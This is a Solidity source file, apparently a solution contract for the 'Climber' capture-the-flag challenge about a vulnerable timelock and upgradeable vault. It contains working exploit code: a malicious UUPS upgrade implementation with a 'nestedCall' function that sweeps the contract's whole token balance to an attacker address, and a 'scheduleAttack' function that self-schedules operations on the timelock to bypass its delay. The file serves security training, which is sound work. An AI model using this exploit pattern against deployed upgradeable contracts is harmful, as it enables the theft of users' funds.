// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "hardhat/console.sol";
import "../climber/ClimberTimelock.sol";

contract ClimberUpgrade is Initializable, OwnableUpgradeable, UUPSUpgradeable {

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() initializer {}

    bytes[] public dataElements;

    function initialize() initializer external{
        __Ownable_init();
        __UUPSUpgradeable_init();
    }

    function nestedCall(address _token, address attacker) external{
        uint256 amount = IERC20(_token).balanceOf(address(this));
        IERC20(_token).transfer(attacker, amount);
        console.log(IERC20(_token).balanceOf(attacker));
    }

    function scheduleAttack(
        address payable climber,
        address[] calldata targets,
        uint256[] calldata values) external{


        ClimberTimelock(climber).schedule(targets, values, dataElements, "0");
    }

    function setDataElements(bytes[] memory _dataElements) external{
        dataElements = _dataElements;
    }

    function _authorizeUpgrade(address newImplementation) internal onlyOwner override {}
}